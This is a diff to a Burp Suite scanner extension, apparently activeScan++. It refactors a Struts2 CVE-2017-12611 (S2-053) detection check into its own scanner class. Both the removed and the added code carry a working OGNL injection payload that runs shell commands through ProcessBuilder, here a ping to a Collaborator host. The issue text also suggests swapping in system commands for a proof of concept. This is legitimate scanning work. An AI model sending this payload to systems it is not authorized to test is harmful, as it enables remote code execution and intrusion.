@@ -64,6 +64,7 @@ class BurpExtender(IBurpExtender):
             callbacks.registerScannerCheck(SimpleFuzz())
             if not '"type":"none"' in collab_options: callbacks.registerScannerCheck(Solr())
             callbacks.registerScannerCheck(EdgeSideInclude())
+            if not '"type":"none"' in collab_options: callbacks.registerScannerCheck(doStruts_2017_12611_scan())
 
         print "Successfully loaded activeScan++ v" + VERSION
 
@@ -138,7 +139,6 @@ class PerRequestScans(IScannerCheck):
         issues.extend(self.doCodePathScan(basePair, base_resp_print))
         issues.extend(self.doStrutsScan(basePair))
         if not '"type":"none"' in collab_options: issues.extend(self.doStruts_2017_9805_Scan(basePair))
-        if not '"type":"none"' in collab_options: issues.extend(self.doStruts_2017_12611_scan(basePair))
         if not '"type":"none"' in collab_options: issues.extend(self.doXXEPostScan(basePair))
         return issues
 
@@ -246,42 +246,7 @@ class PerRequestScans(IScannerCheck):
         return []
 
 
-# Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
-# Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
-    def doStruts_2017_12611_scan(self, basePair):
-        global callbacks, helpers
-        collab = callbacks.createBurpCollaboratorClientContext()
 
-        # set the blah blah blah needed before and after the command to be executed
-        param_pre = '%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27'
-        param_post = '%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D'
-
-        # Note: other scans in this module use a 'req' that is an array of char codes.
-        #  This one uses a Burp request object, so you'll see it's used differently.
-        req = basePair.getRequest()
-        params = helpers.analyzeRequest(req).getParameters()
-
-        if not params: # this requires a parameter, so if there aren't any, make one
-            debug_msg('No params?  Fine then.  We\'ll add "name".')
-            req = helpers.addParameter(req, helpers.buildParameter('name', '', IParameter.PARAM_URL))
-            params = helpers.analyzeRequest(req).getParameters()
-
-        for param in params: # iterate through parameters, setting each to the payload
-            collab_payload = collab.generatePayload(True) # create a Collaborator payload
-            command = "ping%20" + collab_payload + "%20-c1" # platform-agnostic command to check for RCE via DNS interaction
-            attack_param = param_pre + command + param_post
-            debug_msg('*** The following parameter will be sent for param "' + param.getName() + '":\n' + attack_param)
-
-            attack_req = helpers.updateParameter(req, helpers.buildParameter(param.getName(), attack_param, IParameter.PARAM_URL))
-            attack = callbacks.makeHttpRequest(basePair.getHttpService(), attack_req) # issue the attack request
-            interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
-            if interactions:
-                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(), [attack],
-                    'Struts2 CVE-2017-12611 RCE',
-                    "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
-                    'Firm', 'High')]
-
-        return []
 
 # Based on the plethora of XXE attacks at https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html
 # Tested against https://pentesterlab.com/exercises/play_xxe
@@ -606,6 +571,36 @@ class SuspectTransform(IScannerCheck):
                     break
 
         return issues
+
+    def doPassiveScan(self, basePair):
+        return []
+
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        return is_same_issue(existingIssue, newIssue)
+
+# Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
+# Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
+class doStruts_2017_12611_scan(IScannerCheck):
+    def doActiveScan(self, basePair, insertionPoint):
+        #global callbacks, helpers
+        collab = callbacks.createBurpCollaboratorClientContext()
+
+        # set the blah blah blah needed before and after the command to be executed
+        param_pre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
+        param_post = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
+        collab_payload = collab.generatePayload(True) # create a Collaborator payload
+        command = "ping " + collab_payload + " -c1" # platform-agnostic command to check for RCE via DNS interaction
+        attack_param = param_pre + command + param_post
+
+        attack = request(basePair, insertionPoint, attack_param) # issue the attack request
+        debug_msg(helpers.analyzeRequest(attack).getUrl())
+        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                'Struts2 CVE-2017-12611 RCE',
+                "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
+                'Firm', 'High')]
+        return []
 
     def doPassiveScan(self, basePair):
         return []
